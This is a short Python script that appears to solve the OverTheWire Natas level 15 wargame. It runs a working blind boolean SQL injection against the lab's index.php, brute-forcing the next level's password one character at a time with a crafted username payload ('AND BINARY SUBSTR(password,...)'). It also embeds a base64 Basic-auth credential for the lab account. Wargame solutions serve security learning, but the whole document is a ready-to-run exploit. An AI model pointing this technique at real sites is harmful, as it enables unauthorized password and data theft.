import http.client, re, string, sys

def main():
    chars = list(string.ascii_letters) + list(string.digits)

    conn = http.client.HTTPConnection('natas15.natas.labs.overthewire.org')
    url = '/index.php'
    headers = {
        'Authorization': 'Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    passwd = ''

    for i in range(32):
        for c in chars:
            body = f'username=natas16" AND BINARY SUBSTR(password,{i + 1},1)="{c}"-- '

            conn.request("POST", url, body, headers)
            resp = conn.getresponse()

            if resp.status != 200:
                print('Received an unexpected error')
                sys.exit(1)
            else:
                if re.search('This user exists.', resp.read().decode()):
                    print(f'found password at position {i + 1}')
                    passwd += c
                    break
        else:
            print(f'could not find password at position {i + 1}')
            sys.exit(1)

    conn.close()
    print(f'password is {passwd}')

if __name__ == "__main__":
    main()
